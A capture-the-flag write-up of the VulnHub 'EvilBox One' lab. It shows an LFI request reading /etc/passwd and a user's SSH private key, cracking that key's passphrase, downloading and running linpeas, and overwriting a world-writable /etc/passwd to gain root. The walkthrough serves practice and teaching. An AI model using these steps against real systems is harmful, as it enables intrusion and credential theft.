---
layout: post
title:  "Vulnhub | EvilBox One"
date:   2021-08-30 12:30:00
tags: [Security, Pentesting, VulnHub]
style: border
color: primary
description: "Vulnhub EvilBox One Writeup"
---

Hello friend!

Today I want to cover my writeup of [EVILBOX: ONE](https://www.vulnhub.com/entry/evilbox-one,736/) from VulnHub.

Difficulty: Easy

**P.S: I highly encourage you to try solving the challenges on your own first and if you are stuck you can come by and consult this walkthrough**

## Enumeration/Scanning

First, we'll conduct a `nmap` scan.

```console
# sudo nmap -sC -sV 10.0.2.16 -oN evilboxone-nmap.scan

# Nmap 7.91 scan initiated Sun Aug 29 12:19:32 2021 as: nmap -sC -sV -oN evilboxone-nmap.scan 10.0.2.16
Nmap scan report for 10.0.2.16
Host is up (0.010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: C0:18:85:4C:95:A7 (Hon Hai Precision Ind.)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 29 12:19:46 2021 -- 1 IP address (1 host up) scanned in 14.17 seconds
```

The Nmap scan gives us 2 ports or services.

| Port | State | Service | Version                                        |
|:-----|-------|---------|-----------------------------------------------:|
| 22   | open  | ssh     | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80   | open  | http    | Apache httpd 2.4.38 ((Debian))                 |


### Enumerating port 80
Okay, let's visit the site first.

![A picture of the Debian Apache Default Page](https://i.stack.imgur.com/1NOHl.jpg)

It returns the familiar Debian Apache Default page when Apache is first installed. 

Okay, so we've established that there is an apache web server running on the target but nothing really stands out yet. Let's see if we can build a small site map of the webserver. You can use dirbuster or gobuster or whatever you like. In this write-up, I'm going to use feroxbuster to see if I find any hidden directories. 

```console
# feroxbuster -u http://10.0.2.16 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200 -C 403 -x txt,php,log,bak

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.0.2.16
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [txt, php, log, bak]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      368l      933w    10701c http://10.0.2.16/index.html
200        1l        2w       12c http://10.0.2.16/robots.txt
301        9l       28w      313c http://10.0.2.16/secret
200        0l        0w        0c http://10.0.2.16/secret/evil.php
200        4l        0w        4c http://10.0.2.16/secret/index.html
[####################] - 14s   187440/187440  0s      found:5       errors:0      
[####################] - 8s     23430/23430   2786/s  http://10.0.2.16
[####################] - 12s    23430/23430   1855/s  http://10.0.2.16/secret
```

Under the secret folder, we see `evil.php`. If we visit this URL path we get a blank HTML page.

```console
HTTP/1.1 200 OK
Date: Fri, 27 Aug 2021 11:06:32 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

Not much to really go on here either. Let's see if we can do some fuzzing. 

```console
# ffuf -c -r -u 'http://10.0.2.16/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.16/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27]
:: Progress: [4686/4686] :: Job [1/1] :: 1576 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

## Exploitation (LFI - Local file inclusion)

We find `command`. Let's try this in a web browser.

>http://10.0.2.16/secret/evil.php?command=/etc/passwd


```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```
> **Username:** mowree

Okay, we have a user, mowree. Since LFI is possible let's see if we can traverse into other areas of the target. For example, we know the target is running an ssh service so let's look to see we can find any ssh keys...

You could, in theory, go to this path directly from a web browser but for the sake of best practices, I did a `GET` request in BurpSuite using Repeater.

![GET request using Burpsuite Repeater](https://i.imgur.com/tqyCvkw.png)

**REQUEST**
```console
GET /secret/evil.php?command=/home/mowree/.ssh/id_rsa HTTP/1.1
Host: 10.0.2.16
```

**RESPONSE**
```console
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

## Gaining Access

Awesome we have the RSA private key. That said, it's encrypted. Here we can use a python tool called `ssh2john`. This is a script that basically transforms [RSA/DSA/EC/OpenSSH (SSH private keys)] private key to `john` format for later cracking with **John the Ripper**.

```console
# /usr/share/john/ssh2john.py id_rsa > id.john
```                                                                                             
Now we can use `john` to crack it.

```console
# john id.john -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)
```

> **Passphrase:** unicorn

Now that we have a username, id_rsa private key, and the passphrase. Let's see if we can SSH in.

```console
# ssh mowree@10.0.2.16 -i id_rsa                      
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree)
mowree@EvilBoxOne:~$ whoami
mowree
```

## Privilege Escalation

For simplicity, we'll utilize `linpeas` - Linux Privilege Escalation Awesome Script.

![LinPEAS Logo](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/images/linpeas.png)

Here is the [GitHub Repo](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for more info on LinPEAS.


1. Download `linpeas.sh` on the victim/target.
```console
mowree@EvilBoxOne:~$ cd /dev/shm/
mowree@EvilBoxOne:/dev/shm$ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
```

2. Run `linpeas.sh` and output data to a file
```console
#Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

**OUTPUT**
![Linpeas data output revealing that /etc/passwd is writeable](https://i.imgur.com/8LIlSda.png)

Linpeas data output revealing that `/etc/passwd` is writeable
```console
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                  
/dev/mqueue                                                                                                                                                                                                                                   
/dev/shm
/dev/shm/linpeas.txt
/etc/passwd
/home/mowree
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/lib/php/sessions
/var/tmp
```

Verifying user, group, other permissions on the `/etc/passwd` file.

```console
mowree@EvilBoxOne:/dev/shm$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 29 19:09 /etc/passwd
```

Linpeas discovered for us that `/etc/passwd` is writeable by anyone.

Let's take a look at the `/etc/passwd` file.

```console
mowree@EvilBoxOne:/dev/shm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

Specifically were interested in:
```console
root:x:0:0:root:/root:/bin/bash
```

The “x” in a row represents that the hash of the password of the user is stored in the /etc/shadow file. Since we can manually edit this file let's replace the "x" with a hashed password "leftycatchersmitt" for the user root.

```console
mowree@EvilBoxOne:/dev/shm$ openssl passwd -1 leftycatchersmitt
$1$4RWl6sXT$QAi/le7cM92rCosqbOfvN/
mowree@EvilBoxOne:/dev/shm$ nano /etc/passwd
GNU nano 3.2                                                              /etc/passwd                                                                                                                 

root:$1$4RWl6sXT$QAi/le7cM92rCosqbOfvN/:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

Now we should be able to log in as the user root.

```console
mowree@EvilBoxOne:/dev/shm$ su -l root
Contraseña: 
root@EvilBoxOne:/dev/shm# whoami
root
root@EvilBoxOne:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@EvilBoxOne:/dev/shm# cd /root
root@EvilBoxOne:/root# ls -lash
total 24K
4,0K drwx------  3 root 4,0K ago 16 13:06 .
4,0K drwxr-xr-x 18 root 4,0K ago 16 11:16 ..
   0 lrwxrwxrwx  1 root    9 ago 16 13:06 .bash_history -> /dev/null
4,0K -rw-r--r--  1 root 3,5K ago 16 11:20 .bashrc
4,0K drwxr-xr-x  3 root 4,0K ago 16 11:40 .local
4,0K -rw-r--r--  1 root  148 ago 17  2015 .profile
4,0K -r--------  1 root   31 ago 16 12:57 root.txt
root@EvilBoxOne:/root# cat root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

We got root! Success! 
